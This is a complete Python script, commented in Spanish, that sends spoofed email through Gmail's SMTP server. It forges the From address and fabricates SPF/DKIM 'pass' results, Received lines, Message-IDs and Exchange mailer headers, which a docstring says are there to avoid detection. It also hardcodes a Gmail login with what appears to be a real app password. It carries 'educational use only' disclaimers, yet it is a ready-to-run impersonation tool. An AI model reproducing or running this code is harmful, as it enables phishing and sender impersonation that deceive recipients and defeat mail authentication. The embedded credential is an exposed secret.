#########################################################
# Suplantacion de email utilizando google: smtp.gmail.com
# Falsifica  las verificaciones SPF
# Genera un MessageID legitimo
# Cabeceras X-Mmiler: Exchange Server2016
# usar solo con fines educativos
#########################################################

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import ssl
from email.utils import formataddr, make_msgid
from email.header import Header
import random
import time
import hashlib

class AdvancedEmailSpoofing:
    def __init__(self):
        # Configuración mejorada con múltiples opciones SMTP
        self.smtp_servers = [
            {
                "server": "smtp.gmail.com",
                "port": 587,
                "email": "antonio.taboada@gmail.com",
                "password": "satk lnxi lpti vav"
            }
        ]

        # Email que quieres suplantar
        self.spoofed_email = "hackingyseguridad@hackingyseguridad.com"
        self.spoofed_name = "Departamento de Seguridad Hacking <hackingyseguridad@hackingyseguridad.com>"

        # Destinatario
        self.recipient_email = "antonio.taboada@telefonica.net"
        self.recipient_name = "Antonio Taboada"

    def generate_message_id(self, domain="hackingyseguridad.com"):
        """Genera un Message-ID legítimo"""
        timestamp = int(time.time())
        random_hash = hashlib.md5(f"{timestamp}{random.randint(1000,9999)}".encode()).hexdigest()[:16]
        return f"<{timestamp}.{random_hash}@{domain}>"

    def create_advanced_headers(self, msg):
        """Cabeceras avanzadas para evitar detección"""

        # Cabeceras principales ofuscadas
        msg["From"] = formataddr((
            str(Header(self.spoofed_name, 'utf-8')),
            self.spoofed_email
        ))
        msg["To"] = formataddr((
            str(Header(self.recipient_name, 'utf-8')),
            self.recipient_email
        ))
        msg["Subject"] = str(Header("prueba de suplantación", 'utf-8'))

        # Message-ID legítimo
        msg["Message-ID"] = self.generate_message_id("hackingyseguridad.com")

        # Cabeceras de respuesta y routing
        msg["Reply-To"] = self.spoofed_email
        msg["Return-Path"] = f"<bounce-{self.spoofed_email}>"
        msg["Disposition-Notification-To"] = self.spoofed_email

        # Simular servidor Exchange de Hacking
        msg["X-Mailer"] = "Microsoft Exchange Server 2016"
        msg["X-MimeOLE"] = "Microsoft Exchange Server 2016"
        msg["MS-Has-Attach"] = "no"
        msg["MS-TNEF-Correlator"] = self.generate_message_id("hackingyseguridad.com")

        # Cabeceras de autenticación falsas
        msg["Authentication-Results"] = f"hackingyseguridad.com; spf=pass smtp.mailfrom={self.spoofed_email}; dkim=pass"
        msg["Received-SPF"] = f"Pass (protection.hackingyseguridad.com: domain of {self.spoofed_email} designates 195.235.113.0 as permitted sender)"

        # Cabeceras de prioridad y tracking
        msg["X-Priority"] = "1"
        msg["Importance"] = "high"
        msg["X-MSMail-Priority"] = "High"
        msg["X-Report-Abuse"] = f"Please report abuse to {self.spoofed_email}"

        # Cabeceras de ruta falsas
        msg["Received"] = f"from [195.235.113.12] (mail.hackingyseguridad.com [195.235.113.12]) by exchange.hackingyseguridad.com with ESMTP id {self.generate_message_id()}"

        return msg

    def create_obfuscated_html(self):
        """HTML con técnicas de ofuscación"""

        return f"""
        <!DOCTYPE html>
        <html>
        <head>
            <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Hacking - Comunicación de Seguridad</title>
        </head>
        <body>
            <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
                <h2>prueba de suplantación</h2>
                <p>Este es un mensaje de prueba para demostrar técnicas de suplantación de email con fines educativos.</p>
                <p><strong>Remitente:</strong> {self.spoofed_email}</p>
                <p><strong>Destinatario:</strong> {self.recipient_email}</p>
                <hr>
                <p style="color: #666; font-size: 12px;">
                    Este email es parte de una prueba de seguridad autorizada.
                    El uso malintencionado de estas técnicas es ilegal.
                </p>
            </div>
        </body>
        </html>
        """

    def create_spoofed_email(self):
        """Crea el email con todas las técnicas de ofuscación"""
        msg = MIMEMultipart('mixed')

        # Aplicar cabeceras avanzadas
        msg = self.create_advanced_headers(msg)

        # Agregar cuerpo HTML ofuscado
        html_body = self.create_obfuscated_html()
        msg.attach(MIMEText(html_body, "html", "utf-8"))

        # Opcional: agregar un archivo adjunto legítimo (logo, etc.)
        # self.add_legitimate_attachment(msg)

        return msg

    def send_with_best_smtp(self):
        """Intenta enviar con diferentes servidores SMTP"""

        for smtp_config in self.smtp_servers:
            try:
                print(f"🔧 Probando con {smtp_config['server']}...")

                context = ssl.create_default_context()

                with smtplib.SMTP(smtp_config["server"], smtp_config["port"]) as server:
                    server.ehlo()
                    server.starttls(context=context)
                    server.ehlo()

                    # Login con credenciales específicas
                    server.login(smtp_config["email"], smtp_config["password"])

                    # Crear mensaje
                    message = self.create_spoofed_email()

                    # Envío estratégico
                    server.sendmail(
                        self.spoofed_email,  # MAIL FROM suplantado
                        [self.recipient_email],
                        message.as_string()
                    )

                print(f"✅ Email enviado exitosamente mediante {smtp_config['server']}")
                print(f"📧 Remitente visible: {self.spoofed_email}")
                print(f"🎯 Destinatario: {self.recipient_email}")
                print(f"🔑 Cuenta SMTP utilizada: {smtp_config['email']}")
                print(f"📋 Asunto: prueba de suplantación")
                print(f"🆔 Message-ID: {message['Message-ID']}")

                return True

            except smtplib.SMTPRecipientsRefused as e:
                print(f"❌ Destinatario rechazado por {smtp_config['server']}: {e}")
            except smtplib.SMTPAuthenticationError as e:
                print(f"❌ Autenticación fallida en {smtp_config['server']}: {e}")
            except smtplib.SMTPSenderRefused as e:
                print(f"❌ Remitente rechazado por {smtp_config['server']}: {e}")
            except Exception as e:
                print(f"❌ Error con {smtp_config['server']}: {e}")

        return False

    def test_all_connections(self):
        """Prueba todas las conexiones SMTP disponibles"""
        working_servers = []

        for smtp_config in self.smtp_servers:
            try:
                with smtplib.SMTP(smtp_config["server"], smtp_config["port"]) as server:
                    server.ehlo()
                    server.starttls()
                    server.ehlo()
                    server.login(smtp_config["email"], smtp_config["password"])
                    print(f"✅ Conexión exitosa: {smtp_config['server']}")
                    working_servers.append(smtp_config)
            except Exception as e:
                print(f"❌ Fallo en {smtp_config['server']}: {e}")

        return working_servers

# USO CON PRECAUCIONES - SOLO PARA FINES EDUCATIVOS
if __name__ == "__main__":
    print()
    sender = AdvancedEmailSpoofing()
    # Probar conexiones primero
    print("🔍 Probando conexiones SMTP disponibles...")
    working_servers = sender.test_all_connections()

    if working_servers:
        print(f"\n🎯 Enviando email de prueba...")
        success = sender.send_with_best_smtp()
